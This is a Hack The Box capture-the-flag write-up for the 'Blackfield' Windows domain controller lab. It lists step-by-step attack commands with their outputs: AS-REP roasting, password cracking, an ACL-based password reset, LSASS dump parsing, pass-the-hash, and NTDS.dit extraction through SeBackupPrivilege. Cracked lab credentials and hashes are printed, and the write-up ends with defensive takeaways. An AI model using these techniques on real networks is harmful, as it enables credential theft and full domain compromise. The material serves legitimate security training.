# HTB Write-Up: Blackfield

| Field      | Details                                                          |
|------------|------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Blackfield)   |
| Difficulty | Hard                                                             |
| OS         | Windows                                                          |
| Author     | Babayev                                                          |
| Date       | June 17, 2026                                                    |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — SMB Shares & User Discovery](#2-enumeration--smb-shares--user-discovery)
3. [Initial Access — AS-REP Roasting & Password Cracking](#3-initial-access--as-rep-roasting--password-cracking)
4. [Lateral Movement — BloodHound, ForceChangePassword & LSASS Dump](#4-lateral-movement--bloodhound-forcechangepassword--lsass-dump)
5. [Privilege Escalation — SeBackupPrivilege & NTDS Extraction](#5-privilege-escalation--sebackupprivilege--ntds-extraction)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for fast port discovery:

```bash
rustscan -a 10.129.229.17 --ulimit 5000
```

**Open Ports:**

| Port  | Service    | Details                              |
|-------|------------|--------------------------------------|
| 53    | DNS        | Microsoft DNS                        |
| 88    | Kerberos   | Microsoft Windows Kerberos           |
| 135   | MSRPC      | Microsoft Windows RPC                |
| 389   | LDAP       | Domain: `BLACKFIELD.local`           |
| 445   | SMB        | microsoft-ds                         |
| 593   | HTTP-RPC   | RPC over HTTP                        |
| 5985  | WinRM      | Windows Remote Management            |

The host is a **Domain Controller** running **Windows Server 2019** (Build 17763), hostname **DC01**, domain: **`BLACKFIELD.local`**. No HTTP server is exposed — this is a pure AD machine. No starting credentials were provided.

---

## 2. Enumeration — SMB Shares & User Discovery

### 2.1 — Null / Guest Authentication

SMB was tested with both null and guest authentication:

```bash
nxc smb 10.129.229.17 -u guest -p '' --shares
```

**Output:**

```
SMB  10.129.229.17  445  DC01  Share           Permissions  Remark
SMB  10.129.229.17  445  DC01  -----           -----------  ------
SMB  10.129.229.17  445  DC01  ADMIN$                       Remote Admin
SMB  10.129.229.17  445  DC01  C$                           Default share
SMB  10.129.229.17  445  DC01  forensic                     Forensic / Audit share.
SMB  10.129.229.17  445  DC01  IPC$            READ         Remote IPC
SMB  10.129.229.17  445  DC01  NETLOGON                     Logon server share
SMB  10.129.229.17  445  DC01  profiles$       READ
SMB  10.129.229.17  445  DC01  SYSVOL                       Logon server share
```

Two non-standard shares stand out: **`forensic`** (inaccessible yet) and **`profiles$`** (readable with guest/null).

### 2.2 — User Enumeration from profiles$ Share

The `profiles$` share contained hundreds of user profile folders — effectively a full domain user list:

```bash
smbclient //10.129.229.17/profiles$ -N
smb: \> ls
```

Notable entries among the profile directories included `audit2020`, `support`, and `svc_backup`. The full directory listing was extracted and cleaned into a wordlist for AS-REP roasting:

```bash
cat user | awk '{print $1}' > users
```

---

## 3. Initial Access — AS-REP Roasting & Password Cracking

### 3.1 — AS-REP Roasting with GetNPUsers

The extracted userlist was fed to `impacket-GetNPUsers` to identify accounts with Kerberos pre-authentication disabled:

```bash
impacket-GetNPUsers -no-pass -usersfile users BLACKFIELD.local/ -request
```

Most usernames returned `KDC_ERR_C_PRINCIPAL_UNKNOWN` because the profile folder names did not exactly match SAM account names. However, two accounts were recognised — and `support` had pre-auth disabled, yielding a roastable AS-REP hash:

```
$krb5asrep$23$support@BLACKFIELD.LOCAL:ac8578f2879930079046379b782f1adf$bcf3d853...
```

### 3.2 — Cracking the Hash with John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=krb5asrep
```

**Result:**

```
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)
1g 0:00:00:05 DONE
```

Credentials recovered: **`support:#00^BlackKnight`**

### 3.3 — Validating Access

```bash
nxc smb 10.129.229.17 -u support -p '#00^BlackKnight' --shares
```

`support` can authenticate successfully but still has no access to the `forensic` share. SMB share browsing of `NETLOGON` and `SYSVOL` returned nothing useful.

---

## 4. Lateral Movement — BloodHound, ForceChangePassword & LSASS Dump

### 4.1 — BloodHound Domain Enumeration

BloodHound data was collected using `bloodhound-python`:

```bash
bloodhound-python -ns 10.129.229.17 -d BLACKFIELD.local -c All \
  -u support -p '#00^BlackKnight' --zip
```

BloodHound revealed a critical edge: **`SUPPORT@BLACKFIELD.LOCAL` has `ForceChangePassword` rights over `AUDIT2020@BLACKFIELD.LOCAL`**, meaning the password of `audit2020` can be reset without knowing the current one.

### 4.2 — Password Reset via bloodyAD

```bash
bloodyad --host 10.129.229.17 -d BLACKFIELD.local \
  -u support -p '#00^BlackKnight' \
  set password AUDIT2020 'aliska123!'
```

```
[+] Password changed successfully!
```

### 4.3 — Accessing the forensic Share as audit2020

With `audit2020` credentials the `forensic` share (previously inaccessible) became readable. It contained a Windows memory dump:

```
forensic\memory analysis\lsass.DMP
```

The file was downloaded locally and parsed with **pypykatz**:

```bash
pypykatz lsa minidump lsass.DMP
```

**Output (excerpt):**

```
== LogonSession ==
username svc_backup
domainname BLACKFIELD

== MSV ==
  NT: 9658d1d1dcd9250115e2205d9f48400d
  SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
```

NT hash for `svc_backup` extracted: **`9658d1d1dcd9250115e2205d9f48400d`**

### 4.4 — WinRM Shell as svc_backup

```bash
evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

Shell obtained. User flag retrieved from `C:\Users\svc_backup\Desktop\user.txt`:

```
3920bb317a0bef51027e2852be64b543
```

---

## 5. Privilege Escalation — SeBackupPrivilege & NTDS Extraction

### 5.1 — Privilege Inspection

```powershell
whoami /priv
```

**Output:**

```
SeBackupPrivilege    Back up files and directories  Enabled
SeRestorePrivilege   Restore files and directories  Enabled
```

`svc_backup` holds **`SeBackupPrivilege`** — this allows reading any file on the system regardless of ACLs, including the NTDS database and SYSTEM hive. Direct `reg save` of SAM/SECURITY was attempted first but `SECURITY` was denied and `secretsdump` on SAM alone did not yield domain hashes, so the NTDS path was pursued instead.

### 5.2 — NTDS Extraction via DiskShadow + Robocopy

A DiskShadow script was prepared (`test.dsh`):

```
set context persistent nowriters
add volume c: alias mq
create
expose %mq% z:
```

It was uploaded and executed:

```powershell
mkdir C:\temp
upload test.dsh
diskshadow /s test.dsh
```

The shadow copy was exposed as `Z:\`. The NTDS database was then copied out using Robocopy in backup mode (bypassing ACLs):

```powershell
robocopy /b z:\windows\ntds . ntds.dit
```

The SYSTEM hive was also saved:

```powershell
reg save hklm\system c:\temp\system.bak
```

Both files were downloaded to the attack host.

### 5.3 — Dumping All Hashes with secretsdump

```bash
impacket-secretsdump -system system.bak -ntds ntds.dit local
```

**Output (key hashes):**

```
[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c

Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```

Administrator NT hash: **`184fb5e5178480be64824d4cd53b99ee`**

### 5.4 — Root via Pass-the-Hash

```bash
evil-winrm -i 10.129.229.17 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

Root flag retrieved from `C:\Users\Administrator\Desktop\root.txt`:

```
4375a629c7c67c8e29db269060c955cb
```

---

## 6. Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | RustScan | DC01 identified, Windows Server 2019; `profiles$` and `forensic` shares noted |
| User Discovery | `smbclient` on `profiles$` | Hundreds of profile folders exposed; key accounts `support`, `audit2020`, `svc_backup` identified |
| Initial Access | AS-REP Roasting + John | `support` hash cracked → `#00^BlackKnight` |
| ACL Abuse | BloodHound + `ForceChangePassword` | `support` reset `audit2020` password via bloodyAD |
| Credential Dump | pypykatz on `lsass.DMP` | `svc_backup` NT hash extracted from memory dump |
| User Flag | Evil-WinRM + Pass-the-Hash | Shell as `svc_backup`; `user.txt` retrieved |
| Privilege Escalation | `SeBackupPrivilege` + DiskShadow + Robocopy | `ntds.dit` + SYSTEM hive extracted from VSS shadow copy |
| Root | impacket-secretsdump + Evil-WinRM PtH | Administrator hash dumped; `root.txt` retrieved |

### Key Takeaways

- **Null/guest SMB access is a foothold.** The `profiles$` share was accessible without credentials and leaked the full domain username list. Even a read-only share with no sensitive files can be enough to fuel the next attack stage.

- **AS-REP Roasting is still highly effective when account naming is guessable.** The profile folder names didn't directly match SAM names, but the real accounts `support` and `svc_backup` were listed among them. A targeted spray with the right usernames yields a crackable hash in seconds with no authentication required.

- **BloodHound ACL edges are attack paths, not just findings.** `ForceChangePassword` is often overlooked because it doesn't look as dramatic as `DCSync` or `GenericAll`. But it's a direct pivot to another account — in this case opening access to a memory dump containing the next credential.

- **LSASS memory dumps in forensic shares are credential goldmines.** Storing `lsass.DMP` on a network share — even a restricted one — is equivalent to leaving NT hashes in a file on disk. Any account that can read the share can pass the hash.

- **`SeBackupPrivilege` is a path to NTDS.** The privilege exists to allow backup software to read any file, but an attacker with this privilege can copy `ntds.dit` directly from a VSS shadow copy using nothing but built-in Windows tools (`diskshadow`, `robocopy`). Service accounts with backup roles on DCs must be treated as tier-0 assets.

- **`reg save` on SAM alone is not enough when the domain is the target.** The SAM hive only stores local account hashes. For domain credentials, NTDS is required — and `SeBackupPrivilege` makes that extraction trivial.
